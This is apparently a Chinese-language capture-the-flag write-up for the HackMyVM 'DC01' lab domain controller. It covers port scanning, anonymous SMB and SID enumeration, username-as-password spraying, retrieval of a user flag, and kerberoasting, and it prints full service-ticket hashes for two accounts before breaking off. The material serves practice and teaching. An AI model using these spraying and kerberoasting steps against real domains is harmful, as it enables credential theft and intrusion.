{"pageProps":{"postData":{"id":"HackMyVMDC01","contentHtml":"<h1>DC01.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=DC01\">https://hackmyvm.eu/machines/machine.php?vm=DC01</a></p>\n</blockquote>\n<p>note：<strong>Just enjoy my first Windows DC</strong></p>\n<h2>信息打点</h2>\n<pre><code class=\"hljs language-c\"><span class=\"hljs-comment\">// 探测主机</span>\nnmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.0</span>/<span class=\"hljs-number\">24</span>           \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-19 01:47 EST            </span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.1</span>      \nHost is up (<span class=\"hljs-number\">0.00050</span>s latency).         \nMAC Address: <span class=\"hljs-number\">0</span>A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">09</span> (Unknown)                                      \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.2</span>      \nHost is up (<span class=\"hljs-number\">0.00041</span>s latency).         \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:FB:<span class=\"hljs-number\">9B</span>:E7 (Oracle VirtualBox virtual NIC)                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>    \nHost is up (<span class=\"hljs-number\">0.00036</span>s latency).         \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">41</span>:A7:DA (Oracle VirtualBox virtual NIC)                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.4</span>\n<span class=\"hljs-comment\">// 扫描主机所有端口</span>\nnmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>                               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-19 01:58 EST            </span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>                                           \nHost is up (<span class=\"hljs-number\">0.00078</span>s latency).         \nNot shown: <span class=\"hljs-number\">65517</span> filtered tcp ports (no-response)                             \nPORT      STATE SERVICE                \n<span class=\"hljs-number\">53</span>/tcp    open  domain                                                        \n<span class=\"hljs-number\">88</span>/tcp    open  kerberos-sec           \n<span class=\"hljs-number\">135</span>/tcp   open  msrpc                  \n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn                                                   \n<span class=\"hljs-number\">389</span>/tcp   open  ldap                   \n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds           \n<span class=\"hljs-number\">464</span>/tcp   open  kpasswd5                                                      \n<span class=\"hljs-number\">593</span>/tcp   open  http-rpc-epmap         \n<span class=\"hljs-number\">636</span>/tcp   open  ldapssl                \n<span class=\"hljs-number\">3268</span>/tcp  open  globalcatLDAP                                                 \n<span class=\"hljs-number\">3269</span>/tcp  open  globalcatLDAPssl       \n<span class=\"hljs-number\">5985</span>/tcp  open  wsman                  \n<span class=\"hljs-number\">9389</span>/tcp  open  adws                                                          \n<span class=\"hljs-number\">49664</span>/tcp open  unknown                           \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">41</span>:A7:DA (Oracle VirtualBox virtual NIC)\n<span class=\"hljs-comment\">// 版本探测以及系统版本探测</span>\nnmap -sT -sV -O -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>                                        \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-01-19 02:02 EST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>                                                                                                                          \nHost is up (<span class=\"hljs-number\">0.00067</span>s latency).                                                \nNot shown: <span class=\"hljs-number\">65517</span> filtered tcp ports (no-response)                             \nPORT      STATE SERVICE       VERSION                                         \n<span class=\"hljs-number\">53</span>/tcp    open  domain        Simple DNS Plus\n<span class=\"hljs-number\">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class=\"hljs-number\">2025</span><span class=\"hljs-number\">-01</span><span class=\"hljs-number\">-19</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">08</span>Z)                                                                 \n<span class=\"hljs-number\">135</span>/tcp   open  msrpc         Microsoft Windows RPC                           \n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                   \n<span class=\"hljs-number\">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds?          \n<span class=\"hljs-number\">464</span>/tcp   open  kpasswd5?              \n<span class=\"hljs-number\">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class=\"hljs-number\">1.0</span>             \n<span class=\"hljs-number\">636</span>/tcp   open  tcpwrapped             \n<span class=\"hljs-number\">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           \n<span class=\"hljs-number\">3269</span>/tcp  open  tcpwrapped             \n<span class=\"hljs-number\">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class=\"hljs-number\">2.0</span> (SSDP/UPnP)         \n<span class=\"hljs-number\">9389</span>/tcp  open  mc-nmf        .NET Message Framing                            \n<span class=\"hljs-number\">49664</span>/tcp open  msrpc         Microsoft Windows RPC                           \n<span class=\"hljs-number\">49667</span>/tcp open  msrpc         Microsoft Windows RPC                           \n<span class=\"hljs-number\">49674</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class=\"hljs-number\">1.0</span>             \n<span class=\"hljs-number\">49687</span>/tcp open  msrpc         Microsoft Windows RPC                           \n<span class=\"hljs-number\">49707</span>/tcp open  msrpc         Microsoft Windows RPC                           \nMAC Address: <span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">41</span>:A7:DA (Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open and <span class=\"hljs-number\">1</span> closed port                                                        \nDevice type: general purpose           \nRunning (JUST GUESSING): Microsoft Windows <span class=\"hljs-number\">2022</span>|<span class=\"hljs-number\">11</span>|<span class=\"hljs-number\">2016</span>|<span class=\"hljs-number\">10</span> (<span class=\"hljs-number\">95</span>%)              \nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10      \nAggressive OS guesses: Microsoft Windows Server <span class=\"hljs-number\">2022</span> (<span class=\"hljs-number\">95</span>%), Microsoft Windows <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">21</span>H2 (<span class=\"hljs-number\">91</span>%), Microsoft Windows Server <span class=\"hljs-number\">2016</span> (<span class=\"hljs-number\">91</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> (<span class=\"hljs-number\">86</span>%) \nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (test conditions non-ideal).                     \nNetwork Distance: <span class=\"hljs-number\">1</span> hop                \nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>\n<p>分析：可以看到该靶机存在<code>53，88，445</code>端口，推测该靶机是DC，存在445端口也可以枚举</p>\n<h2>渗透</h2>\n<h3>SMB</h3>\n<p>没有任何频凭据，所以只能首先查看SMB里共享了什么</p>\n<pre><code class=\"hljs language-c\">smbclient -L <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \n        Users           Disk      \nReconnecting with SMB1 <span class=\"hljs-keyword\">for</span> workgroup listing.\ndo_connect: Connection to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n</code></pre>\n<p>尝试都去访问一边，使用空密码，挺多可以进去的</p>\n<pre><code class=\"hljs language-c\">┌──(root㉿kali)-[~/Desktop/test/DC01]  \n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/ADMIN$</span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:                                                \ntree connect failed: NT_STATUS_ACCESS_DENIED\n\n┌──(root㉿kali)-[~/Desktop/test/DC01]\n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/backup                                         </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> \n\n┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                 [<span class=\"hljs-number\">0</span>/<span class=\"hljs-number\">229</span>]\n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/C$                                             </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:                                                                                                                               \ntree connect failed: NT_STATUS_ACCESS_DENIED                                                                                                                 \n                                                                                                                                                             \n┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        \n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/IPC$                                           </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:                                                                                                                               \nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.                                                                                                               \nsmb: \\>                                                                                                                                                \n\n┌──(root㉿kali)-[~/Desktop/test/DC01]                                         \n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/NETLOGON                                       </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:                                                \nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.                                                                                                               \nsmb: \\>                            \n                                                                           \n┌──(root㉿kali)-[~/Desktop/test/DC01]  \n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/SYSVOL  </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:       \nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.                                \nsmb: \\>                                                                \n\n┌──(root㉿kali)-[~/Desktop/test/DC01]\n└─<span class=\"hljs-meta\"># smbclient <span class=\"hljs-comment\">//192.168.56.128/users                                          </span></span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> \n\n</code></pre>\n<p>但是能读取只有<code>IPC$</code> ，但是里边什么都没有</p>\n<pre><code class=\"hljs language-c\">smbclient <span class=\"hljs-comment\">//192.168.56.128/IPC$</span>\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\root]:\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> mget\nnothing to mget\n</code></pre>\n<h3>用户信息枚举</h3>\n<p>使用<code>impacket</code>工具包里边的<strong>lookupsid</strong></p>\n<p>通过nmap扫描我们可以知道域是<code>SOUPEDECODE.LOCAL0.</code> 将结果存为<code>user.txt</code></p>\n<pre><code class=\"hljs language-c\">lookupsid.py SOUPEDECODE.LOCAL0./anonymous@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.128</span> > user.txt\n</code></pre>\n<p>编写脚本将用户名提取出来，保存为<code>username.txt</code></p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'user.txt'</span>,<span class=\"hljs-string\">'r'</span>) <span class=\"hljs-keyword\">as</span> file:\n    data = file.read()\n    lines = data.splitlines()\n<span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">'username.txt'</span>,<span class=\"hljs-string\">'w+'</span>) <span class=\"hljs-keyword\">as</span> file2:\n    <span class=\"hljs-keyword\">for</span> line <span class=\"hljs-keyword\">in</span> lines:\n        file2.write(line[line.find(<span class=\"hljs-string\">'\\\\'</span>) + <span class=\"hljs-number\">1</span>:line.find(<span class=\"hljs-string\">'('</span>)-<span class=\"hljs-number\">1</span>] + <span class=\"hljs-string\">'\\n'</span>)\n</code></pre>\n<h3>SMB 爆破</h3>\n<p>使用<code>Crackmapexec</code>进行<code>smb</code>爆破</p>\n<pre><code class=\"hljs language-python\">crackmapexec smb <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -u username.txt -p username.txt --<span class=\"hljs-keyword\">continue</span>-on-success --no-bruteforce | grep + \n</code></pre>\n<p>得到一组凭据</p>\n<pre><code class=\"hljs language-python\">SMB     <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  <span class=\"hljs-number\">445</span>    DC01       [+] SOUPEDECODE.LOCAL\\ybob317:ybob317\n</code></pre>\n<p>尝试使用<code>smbexec</code>登录但是提示<code>access denied</code></p>\n<pre><code class=\"hljs language-python\">smbexec.py SOUPEDECODE\\ybob317:ybob317@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[-] SMB SessionError: code: <span class=\"hljs-number\">0xc0000022</span> - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an <span class=\"hljs-built_in\">object</span> but has <span class=\"hljs-keyword\">not</span> been granted those access rights.\n</code></pre>\n<p>使用<code>smbclient</code></p>\n<pre><code class=\"hljs language-python\">smbclient //<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>/users -U SOUPEDECODE.LOCAL/ybob317%ybob317\nTry <span class=\"hljs-string\">\"help\"</span> to get a <span class=\"hljs-built_in\">list</span> of possible commands.\nsmb: \\> <span class=\"hljs-built_in\">dir</span>\n  .                                  DR        <span class=\"hljs-number\">0</span>  Thu Jul  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">2024</span>\n  ..                                DHS        <span class=\"hljs-number\">0</span>  Mon Jun <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">42</span>:<span class=\"hljs-number\">50</span> <span class=\"hljs-number\">2024</span>\n  admin                               D        <span class=\"hljs-number\">0</span>  Thu Jul  <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">49</span>:01 <span class=\"hljs-number\">2024</span>\n  Administrator                       D        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">56</span>:<span class=\"hljs-number\">40</span> <span class=\"hljs-number\">2024</span>\n  All Users                       DHSrn        <span class=\"hljs-number\">0</span>  Sat May  <span class=\"hljs-number\">8</span> 04:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">2021</span>\n  Default                           DHR        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>:08 <span class=\"hljs-number\">2024</span>\n  Default User                    DHSrn        <span class=\"hljs-number\">0</span>  Sat May  <span class=\"hljs-number\">8</span> 04:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">16</span> <span class=\"hljs-number\">2021</span>\n  desktop.ini                       AHS      <span class=\"hljs-number\">174</span>  Sat May  <span class=\"hljs-number\">8</span> 04:<span class=\"hljs-number\">14</span>:03 <span class=\"hljs-number\">2021</span>\n  Public                             DR        <span class=\"hljs-number\">0</span>  Sat Jun <span class=\"hljs-number\">15</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">32</span> <span class=\"hljs-number\">2024</span>\n  ybob317                             D        <span class=\"hljs-number\">0</span>  Mon Jun <span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">32</span> <span class=\"hljs-number\">2024</span>\n</code></pre>\n<h3>UserFlag</h3>\n<pre><code class=\"hljs language-python\">smb: \\ybob317\\Desktop\\> get user.txt \ngetting file \\ybob317\\Desktop\\user.txt of size <span class=\"hljs-number\">32</span> <span class=\"hljs-keyword\">as</span> user.txt (<span class=\"hljs-number\">0.9</span> KiloBytes/sec) (average <span class=\"hljs-number\">0.9</span> KiloBytes/sec)\n</code></pre>\n<pre><code class=\"hljs language-python\">// cat user.txt\n6bab1f09a7403980bfeb4c2b412be47b \n</code></pre>\n<p>获取到userflag后，继续朝着root去</p>\n<h3>kerberoasting</h3>\n<p>但是该用户不允许直接通过<code>smbexec</code>等工具获得命令行，并且我们知道靶机开着88端口，就是<code>kerberos</code>的验证服务，我们可以尝试获取该用户的<code>SPN</code>然后进行<code>kerberoasting</code></p>\n<p><code>kerberoasting</code>本质上就是破解TGS票据，TGS票据使用服务HASH来加密的</p>\n<p>首先第一步就是获取用户<code>SPN</code> ，使用<code>GetUserSpn.py</code></p>\n<pre><code class=\"hljs language-python\">GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -request\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\nServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation \n----------------------  --------------  --------  --------------------------  ---------  ----------\nFTP/FileServer          file_svc                  <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">23.726085</span>  &#x3C;never>               \nFW/ProxyServer          firewall_svc              <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">32.710125</span>  &#x3C;never>               \nHTTP/BackupServer       backup_svc                <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">49.476511</span>  &#x3C;never>               \nHTTP/WebServer          web_svc                   <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">04.569417</span>  &#x3C;never>               \nHTTPS/MonitoringServer  monitoring_svc            <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">18.511871</span>  &#x3C;never>               \n\n[-] CCache file <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> found. Skipping...\n[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n</code></pre>\n<p>发现错误，貌似是因为时区问题导致的失败，调整KALI的时间和靶机的相等</p>\n<pre><code class=\"hljs language-python\">rdate -n <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>\nSun Jan <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">37</span> EST <span class=\"hljs-number\">2025</span>\n</code></pre>\n<p>再次尝试，还是不行，还是一样的错误，继续调整时间</p>\n<pre><code class=\"hljs language-python\">cat /etc/hosts\n<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>       localhost\n<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.1</span>       kali\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span>  SOUPEDECODE.LOCAL\n\n┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        \n└─<span class=\"hljs-comment\"># ntpdate -n SOUPEDECODE.LOCAL                                                                                                                             </span>\nntpdig -s -S -M <span class=\"hljs-number\">500</span> -t <span class=\"hljs-number\">1</span> SOUPEDECODE.LOCAL                                                                                                                   \n                                                                                                                                                             \n┌──(root㉿kali)-[~/Desktop/test/DC01]                                                                                                                        \n└─<span class=\"hljs-comment\"># rdate -n 192.168.56.128                                                                                                                                  </span>\nSun Jan <span class=\"hljs-number\">19</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">35</span> EST <span class=\"hljs-number\">2025</span>  \n</code></pre>\n<p>再次尝试，获取到<code>TGS</code>票据</p>\n<pre><code class=\"hljs language-python\">GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.128</span> -request                                                                          \nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies                                                                                        \n                                                                                                                                                             \nServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation                                                          \n----------------------  --------------  --------  --------------------------  ---------  ----------                                                          \nFTP/FileServer          file_svc                  <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">23.726085</span>  &#x3C;never>                                                                        \nFW/ProxyServer          firewall_svc              <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">32.710125</span>  &#x3C;never>                                                                        \nHTTP/BackupServer       backup_svc                <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">49.476511</span>  &#x3C;never>                                                                        \nHTTP/WebServer          web_svc                   <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">04.569417</span>  &#x3C;never>                                                                        \nHTTPS/MonitoringServer  monitoring_svc            <span class=\"hljs-number\">2024</span>-06-<span class=\"hljs-number\">17</span> <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">18.511871</span>  &#x3C;never>  \n\n$krb5tgs$<span class=\"hljs-number\">23</span>$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$019455c504de5eb8e4cb734f4fbc3299$94555f097c6b5bfc3b7af2ea53c00e9f98c5d719b9c21c299f31e2352777858e4bc07462b30b41bb196b667b112a8b0db7e26c68f7aa9c0e38d0cc469b00be4806139dbbda840a02293a39878fb937285f71f211a4575bb15ea398fc17c62716e36828fe70fbc1ee5169d4c19232530aa2a59c5196031ccf38d6a764ebbd691175cc7fe1be73b5a3935b14ea22f721ec17de7fa539c0dbc83b238a81d612609d223f883c4c8201f9317adba1cc34e5deba51ef2d3e2da11fd0d4d4abd17fa10aa4ff7582f963f8954647966c691442b738b9943a32c0db312c245ca0d4e362aa47a469656bef13e380642e2b07767ae2bf95dc9252c910c605811d3fd144303711655806db728b96820b6144c622cde83bc962f41f9d45fdd36e105ec4313704df3738fcfc9be8f75e07397596fa75acc0ebf44e9af14bac8e915f81200b9004c8d65003a750c493d1e64b8897d3566d863111d8fcfa608b557f583ffbaf443e56887b4ce1dc22ce22deaafa9074ddb1c45209571498bb6c2fedbb77bad9f27b2afd521fcf412e5daefcba64f83deead8d8c626fe93850df3909ad06b81ef2f6b4527c357a0d3356b52501ac706c9fc4b89e920ba0792a52fead66e17cf4ea2a4dfbbfc65afe29642cc70a624ed4450073279b5587a2705b3efc1a6ecb3b85fb77f33152f24b7f44b1690115e285c95e99fca867427b6d39fa171b9d104c197b02f3b8e79d31cddc6c27d760a2df58d99bf86cf30a9be2b83042d7beb31fd68ac6e545960f5af76c10c6d92c1bd2523b1de5a6d57e80c140c1f0160e9303e30fc8f3a93592a3cb142353a4719bbe836441c7047e4d0cef8c988d4143cc924f8f02c219c9c3637b9332c1e3b10b995a1c006b5310076502072211149e4d067d0a36595b92afa94772726471dd5a90f596033d03f21bc6a920dbac64e34a3f74f6dc7426ae0eb31edad81221c7bcc59cbe40b07268ea12d1695b645b1abec582d29231968c1f325062cf22625257f2273123ed74c1b5979dce2655764f77f03d2b4bcafb0c14c30f41f578d17af2c3a8e1f1313cb89225d52ef68ee868d5b2e57a89f2d3421fbea8898156ad86705d6131a2cfb0e714a7f72d989a873d807986cd2391d4ff59133df5b6531fc4463cede7596d9f9017c75e9b876e60c63904d6eec5c69fe35f54b1d06d414c703a59cff8163ec569e232e46578453531f3fda7381faf7683397bb7fc08c9c51a4051d2130d23b1d5bc832bd1826a812ed20d319bb509522f31ef35806f82b57db423f4f7da7438878282992f60df3936d7a6ba0a70c036c8c9ac0329d79b2e4611abb7b39c8229fd65d4518bf57b504be9ed18c39c8c0a60b2b75b243cb996331761edfb2c5f798b9c1343c4ed61d1ecca61642a15adaee618286cf49c4d6ff2c04678cbeb7bf45474a9e0065c829f9af7e0fc03c5dbaecb16167561674abdab51f84a209fbf20c4dc567f0dc47d18d30ff8c61a48\n$krb5tgs$<span class=\"hljs-number\">23</span>$*firewall_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/firewall_svc*$d834c5f69212f72457e69cee155415b5$889f17466fbad72e22cad3d1c2291b232d8a38cfe714d1f741f7d437664159cd1211cfe9d5df6a5eb3c6a32504c678f21c35e5b26753dab37ebeb1b34623501a78f4b911dd72ff7445da8e979fe9a48e677cd4f3d88e06e91ed26cdfd518582ea3aaa157e65a92525e370a78fd82135e3883719fbab32ebf3babc7be47a4ff7b55a43eb6ae5b3183f12867ec0f66de9e810a4c4b823192b347de7bd4cd2bbfaab7ff9aeacee95476a35dc46f6551327e0379ed8e4bc18e9db58a07a013b21e0889fd74973b496bbea58f9bd0adb961c4f0aceee9de66e0a561f369694d13101edf6f8958d8fd3d8c2d527fc1650c304a0ce1419fe7c4843d28f75c6a37b6429aca1109e8faadce30c624dcbc970f0a8b063b334e5ee003908232af1761f0ae1635d2a308f62ab1070a33e16859203c376ef2ac9c256897e9243fcf9cdf36d9ac2d64b9c6382436fd55631bb6e5a089b28f7388dfb0cdd8a9437dcd39e59a80997c91f798867594e1aaf34121b535c693eb2fffe969cddedca24b4758420002d0e18ba0d21ef36102c79ff55528155acf55c1beacf7c9dd2eea10703021b9f809518d93a37693045f840d1531e91a932be5d03fb0ea7731e365efc9eff58a7793da8b0a2ac3f45994284f2b5dabff8c0641cf93d05bcb8b3845c4ff872a40d4746d662e23917da773b6870488dd97bdbc366d209b456217abefe7edfa26f208fd7fae277394adf5bebd67d8c3cfafc7d04320383e756db70c10f582714006e11344f1eca2bdf1f493fc228fd5041e204eafe8975b958823c51f400877333749ba6eaf3fea20f6a1af22ca5a0e139af19fb24696b3eba78ff1b9a73042b159d6b41844e03872cc2dad2f5c1ffd5bf7c39cf6ac9655c1f324f2aaea1aeb1e01aa5754a6b807d9fcc5ab67f410675c74a4bb04cb198552ee1391d1ffa46dfb79aa75558e4e75781fabe3de599590bd355fd57e722f6c5345bb5e07a5ef6e3ac1ccb90c2e466eeac788d1bd2236ac9c1b4f018cb0c212b2d4d4b24eec2979b95a8ccffe4e5c3980913d373ff36d32c7f2b7e4bb3d57bf1e17a13c32436192bcf0a298a52c215da0434ccedd810b0f7cd5e3c65fdc1e3217b54a6f3f2d838db3cc03c993cac265d29ac0cd1310f56d73afb21f01bdf4b701b06f2f4fd01b6b867d1ad86e629f63dc913c76c323501b55aac8a4fba2f9397d8c3da6541b6222a45366b2928f42fe523d270107b0bb9f5a2f5d89e10f7752e850e442c69487d4ebc7a214e85e8f58f4c631e84cfea6b2a684cb8d600bb2c6de1399e471f08ec5065feae2597169cbc4f7ab1870e77b0277735400751f2b2186ccfba59c0620988133edef0337552477af84a3bf48309afa6e